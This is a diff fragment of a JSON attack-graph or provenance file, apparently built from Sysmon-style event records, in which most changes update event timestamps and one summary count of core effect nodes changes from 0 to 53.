@@ -2987,7 +3043,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:09.430814+00:00"
+        "timestamp": "2026-05-08T16:35:37.879009+00:00"
       }
     },
     {
@@ -3001,7 +3057,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:09.430814+00:00"
+        "timestamp": "2026-05-08T16:35:37.879009+00:00"
       }
     },
     {
@@ -3015,7 +3071,7 @@
       "properties": {
         "action": "Pipe Created",
         "event_id": "17",
-        "timestamp": "2026-05-08T15:44:09.441097+00:00"
+        "timestamp": "2026-05-08T16:35:37.894834+00:00"
       }
     },
     {
@@ -3029,7 +3085,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:09.441097+00:00"
+        "timestamp": "2026-05-08T16:35:37.894834+00:00"
       }
     },
     {
@@ -3043,7 +3099,7 @@
       "properties": {
         "action": "ProcessAccess",
         "event_id": "10",
-        "timestamp": "2026-05-08T15:44:09.444569+00:00"
+        "timestamp": "2026-05-08T16:35:37.910623+00:00"
       }
     },
     {
@@ -3057,7 +3113,7 @@
       "properties": {
         "action": "Pipe Created",
         "event_id": "17",
-        "timestamp": "2026-05-08T15:44:09.444569+00:00"
+        "timestamp": "2026-05-08T16:35:37.910623+00:00"
       }
     },
     {
@@ -3071,7 +3127,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:09.444569+00:00"
+        "timestamp": "2026-05-08T16:35:37.910623+00:00"
       }
     },
     {
@@ -3085,7 +3141,7 @@
       "properties": {
         "action": "Pipe Connected",
         "event_id": "18",
-        "timestamp": "2026-05-08T15:44:09.527979+00:00"
+        "timestamp": "2026-05-08T16:35:38.168042+00:00"
       }
     },
     {
@@ -3099,7 +3155,7 @@
       "properties": {
         "action": "Pipe Created",
         "event_id": "17",
-        "timestamp": "2026-05-08T15:44:09.527979+00:00"
+        "timestamp": "2026-05-08T16:35:38.168042+00:00"
       }
     },
     {
@@ -3113,7 +3169,7 @@
       "properties": {
         "action": "Image Loaded",
         "event_id": "7",
-        "timestamp": "2026-05-08T15:44:09.527979+00:00"
+        "timestamp": "2026-05-08T16:35:38.168042+00:00"
       }
     },
     {
@@ -3127,7 +3183,7 @@
       "properties": {
         "action": "ProcessAccess",
         "event_id": "10",
-        "timestamp": "2026-05-08T15:44:09.527979+00:00"
+        "timestamp": "2026-05-08T16:35:38.168042+00:00"
       }
     },
     {
@@ -3141,7 +3197,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-08T15:44:09.527979+00:00"
+        "timestamp": "2026-05-08T16:35:38.173795+00:00"
       }
     },
     {
@@ -3376,7 +3432,7 @@
     "attack_edges": 74,
     "roots": 16,
     "matched_malicious_nodes": 53,
-    "core_effect_nodes": 0,
+    "core_effect_nodes": 53,
     "matched_whitelist_nodes": 498,
     "matched_overlap_whitelist_override_nodes": 0
   }
